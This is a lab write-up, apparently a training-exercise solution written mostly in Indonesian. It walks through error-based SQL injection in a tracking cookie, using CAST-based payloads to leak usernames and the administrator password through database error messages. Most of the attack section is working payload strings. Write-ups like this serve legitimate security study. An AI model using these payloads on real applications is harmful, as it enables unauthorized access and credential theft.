Visible error-based SQL injection

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.

Berikut adalah pembaruan **Proof of Concept (PoC)** dengan menambahkan payload validasi awal baru:

---

### **1. Deskripsi Query dan Tujuan**
Tujuan dari eksploitasi ini adalah untuk memanfaatkan **error-based SQL injection** pada parameter `trackingId` guna mendapatkan kredensial pengguna admin (`username` dan `password`) dari tabel `users`.

#### **Query Utama:**
```sql
SELECT trackingId FROM trackingIdTable WHERE trackingId = 'pFNj0VuG3fnTFJ3a';
```

Query ini rentan terhadap **SQL injection** karena tidak ada validasi input, sehingga memungkinkan manipulasi menggunakan payload berbahaya.

---

### **2. Payload Validasi Awal**
#### **Payload Awal 1:**
```sql
pFNj0VuG3fnTFJ3a' AND CAST((SELECT 1) AS int)--
```
- **Tujuan:** Memastikan bahwa aplikasi rentan terhadap SQL injection dengan mencoba fungsi `CAST`.
- **`CAST((SELECT 1) AS int)`**: Mengonversi hasil query menjadi tipe data integer, memicu kesalahan jika input tidak valid.

#### **Payload Awal 2 (Baru Ditambahkan):**
```sql
pFNj0VuG3fnTFJ3a' AND 1=CAST((SELECT 1) AS int)--
```
- **Tujuan:** Memvalidasi kerentanan SQL injection menggunakan pernyataan logika `1=CAST((SELECT 1) AS int)`.
- **`1=CAST(...)`**: Mengevaluasi logika untuk memastikan bagian query dapat dieksekusi.

---

### **3. Payload untuk Eksploitasi**

#### **Payload untuk Mengambil Username:**
```sql
pFNj0VuG3fnTFJ3a' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
- **`SELECT username FROM users LIMIT 1`**:
  - Mengambil username pertama dari tabel `users`.
- **`CAST(... AS int)`**:
  - Memaksa aplikasi untuk mencoba mengonversi nilai teks (username) menjadi integer, yang akan menghasilkan pesan error.

#### **Payload untuk Mengambil Password:**
```sql
pFNj0VuG3fnTFJ3a' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
- **`SELECT password FROM users LIMIT 1`**:
  - Mengambil password pertama dari tabel `users`.
- **Pesan Error:** Aplikasi memunculkan pesan error yang mengungkapkan data yang tidak bisa dikonversi, misalnya `fc9v2vqq5gozvlcb0ibj`.

---

### **4. PoC Langkah demi Langkah**

1. **Validasi Awal:**
   Uji aplikasi dengan dua payload validasi:
   ```sql
   pFNj0VuG3fnTFJ3a' AND CAST((SELECT 1) AS int)--
   ```
   ```sql
   pFNj0VuG3fnTFJ3a' AND 1=CAST((SELECT 1) AS int)--
   ```
   **Hasil:** Aplikasi memunculkan pesan error yang menandakan SQL injection berhasil.

2. **Mengambil Username:**
   Eksploitasi untuk mengambil username dari tabel `users`.
   ```sql
   ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
   ```
   **Hasil:** Pesan error aplikasi menampilkan username pertama, misalnya `admin`.

3. **Mengambil Password:**
   Gunakan payload berikut untuk mendapatkan password pengguna:
   ```sql
   ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
   ```
   **Hasil:** Pesan error akan menampilkan password, misalnya `fc9v2vqq5gozvlcb0ibj`.

---

### **5. Penjelasan Detail Query**

#### **1. Validasi SQL Injection**
- Payload validasi bertujuan untuk memastikan kerentanan SQL injection dengan mengeksploitasi fungsi `CAST`:
  - `CAST((SELECT 1) AS int)` mencoba mengubah hasil query menjadi integer.
  - `1=CAST((SELECT 1) AS int)` mengevaluasi logika untuk memvalidasi hasil.

#### **2. Teknik Error-Based SQL Injection**
- **Error-Based SQL Injection** mengeksploitasi pesan error dari fungsi seperti `CAST` untuk mengekstrak data. Saat tipe data tidak sesuai (contoh: mencoba mengubah teks menjadi integer), aplikasi mengungkapkan informasi dari database melalui pesan error.

#### **3. Pengambilan Data Sensitif**
- `SELECT username FROM users LIMIT 1` dan `SELECT password FROM users LIMIT 1` memungkinkan penyerang mengekstrak informasi satu per satu, dimulai dari username hingga password.

---

### **6. Kesimpulan**
Dengan memanfaatkan **error-based SQL injection**, penyerang dapat mengekstrak informasi sensitif seperti username dan password. Berikut adalah payload langkah demi langkah:

1. **Payload Validasi Awal 1:**
   ```sql
   pFNj0VuG3fnTFJ3a' AND CAST((SELECT 1) AS int)--
   ```

2. **Payload Validasi Awal 2:**
   ```sql
   pFNj0VuG3fnTFJ3a' AND 1=CAST((SELECT 1) AS int)--
   ```

3. **Mengambil Username:**
   ```sql
   ' AND CAST((SELECT username FROM users LIMIT 1) AS int)--
   ```

4. **Mengambil Password:**
   ```sql
   ' AND CAST((SELECT password FROM users LIMIT 1) AS int)--
   ```
![image](https://github.com/user-attachments/assets/2cfeaea3-4360-4d59-8c45-4070ae3a2098)
